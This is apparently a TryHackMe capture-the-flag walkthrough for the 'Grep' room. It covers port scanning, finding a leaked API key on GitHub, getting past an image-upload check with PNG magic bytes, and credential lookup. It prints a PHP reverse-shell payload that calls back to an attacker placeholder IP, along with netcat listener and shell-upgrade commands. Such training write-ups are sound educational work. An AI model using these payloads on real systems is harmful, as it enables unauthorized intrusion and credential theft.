# [Grep](https://tryhackme.com/room/greprtp)

## A challenge that tests your reconnaissance and OSINT skills.

# Grep

Welcome to the OSINT challenge, part of TryHackMe’s Red Teaming Path. In this task, you will be an ethical hacker aiming to exploit a newly developed web application.

SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

Your goal is to identify and exploit vulnerabilities in the application using a combination of recon and OSINT skills. As you progress, you’ll look for weak points in the app, find sensitive data, and attempt to gain unauthorized access. You will leverage the skills and knowledge acquired through the Red Team Pathway to devise and execute your attack strategies.

### What is the API key that allows a user to register on the website?

1. 1. Perform a full port scan to enumerate all open services on the target machine:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d3:8a:4f:6f:82:aa:54:23:62:df:ec:52:19:e3:07:e8 (RSA)
|   256 bf:65:e1:c9:fc:13:39:95:d5:c0:8c:32:c2:c2:df:93 (ECDSA)
|_  256 c4:f6:5b:4f:82:15:43:02:a4:7b:e6:9f:74:8e:39:0b (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp   open  ssl/http Apache httpd 2.4.41
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2023-06-14T13:03:09
|_Not valid after:  2024-06-13T13:03:09
|_ssl-date: TLS randomness does not represent time
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
| tls-alpn:
|_  http/1.1
51337/tcp open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: Host: ip-10-112-148-176.eu-central-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Register the discovered hostname in `hosts` so your machine resolves it to the target IP:

```bash
echo "<TARGET_IP> grep.thm" >> /etc/hosts
```

3. Navigate to `https://grep.thm/public/html/`. The page hosts a CMS registration and login portal branded **SearchME**. The registration form requires an **API key** in addition to the standard username/password fields.

4. Use the application name as a [GitHub code search query](https://github.com/search?q=SearchME%21&type=code) to locate the public source repository.

5. Open the [register.php file in the repository](https://github.com/supersecuredeveloper/searchmecms/blob/ccff6f032e61a22961ed3a9596cb4a960d40c4f3/api/register.php). It contains a hardcoded API key that the server compares against every incoming registration request.

[SCREEN01]

---

### What is the first flag?

1. Navigate to `https://grep.thm/public/html/register.php` and fill in the registration form. Intercept the outgoing POST request using Burp Suite and add an `API-Key` header with the value retrieved from the GitHub repository, then forward the modified request. The server accepts the registration:

[SCREEN02]

2. Log in with the newly created account at `https://grep.thm/public/html/login.php`. The first flag is displayed on the dashboard at `https://grep.thm/public/html/dashboard.php`:

[SCREEN03]

---

### What is the email of the "admin" user?

1. Back in the GitHub repository, examine [upload.php](https://github.com/supersecuredeveloper/searchmecms/blob/main/api/upload.php). The endpoint validates uploaded files by inspecting their magic bytes rather than just the file extension. Only signatures matching known image formats are accepted. However, because the check only reads the first few bytes and does not verify the rest of the content, we can prepend valid PNG magic bytes to a PHP reverse shell while keeping a `.php` extension so Apache will execute it as PHP.

2. Create the malicious file by writing the 4-byte PNG magic bytes immediately followed by PHP reverse shell code:

```bash
python3 -c "
with open('shell.php','wb') as f:
    f.write(b'\x89\x50\x4e\x47')  # PNG magic bytes
    f.write(b\"<?php \$sock=fsockopen('<ATTACKER_IP>',4444); \$proc=proc_open('/bin/sh -i',array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes); ?>\")
"
```

3. While logged in, navigate to `https://grep.thm/public/html/upload.php` and upload `shell.php`. The server inspects the file header, sees the PNG signature, and accepts the upload.

4. Set up a Netcat listener on your attacking machine to catch the incoming reverse shell connection:

```bash
nc -lvnp 4444
```

5. Trigger the uploaded shell by visiting `https://grep.thm/api/uploads/shell.php` in your browser. Apache serves and executes the PHP file, spawning a reverse shell that connects back to your listener.

6. Upgrade the reverse shell to a full interactive TTY for stable interaction:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

7. The admin user's email address is stored in a SQL dump file in the web server's backup directory:

```bash
cat /var/www/backup/users.sql
```

[SCREEN04]

---

### What is the host name of the web application that allows a user to check an email for a possible password leak?

1. List the full contents of the web server's root directory:

```bash
cd /var/www/
ls -l
```

**Results:**

```
total 40
drwxr-xr-x 2 ubuntu www-data 4096 Jun 14  2023 backup
-rw-r--r-- 1 root   root     1131 Jun 14  2023 certificate.crt
-rw-r--r-- 1 root   root      960 Jun  2  2023 certificate.csr
drwxr-xr-x 2 ubuntu www-data 4096 Jun 14  2023 default_html
drwxr-xr-x 4 ubuntu www-data 4096 Jun  7  2023 html
-rw-r--r-- 1 root   root     1208 Jun 14  2023 leak_certificate.crt
-rw-r--r-- 1 root   root     1001 Jun 14  2023 leak_certificate.csr
drwxr-xr-x 2 ubuntu www-data 4096 Jun 14  2023 leakchecker
-rw------- 1 root   root     1874 Jun  2  2023 private.key
-rw------- 1 root   root     1704 Jun 14  2023 private_unencrypted.key
```

> The presence of a `leakchecker` directory alongside a dedicated `leak_certificate.crt` and `leak_certificate.csr` pair makes it clear that a second virtual host is configured on the server.

**Answer:** `leakchecker.grep.thm`

---

### What is the password of the "admin" user?

1. Register the new hostname in `hosts`, pointing it to the same target IP. The service was identified on port `51337` during the initial nmap scan. It returned `400 Bad Request` because no valid `Host` header was provided at the time:

```bash
echo "<TARGET_IP> leakchecker.grep.thm" >> /etc/hosts
```

2. Navigate to `https://leakchecker.grep.thm:51337/`. The application allows users to check whether an email address has appeared in a known data breach. Enter the admin email address retrieved from `users.sql` to recover the admin's leaked password:

[SCREEN05]
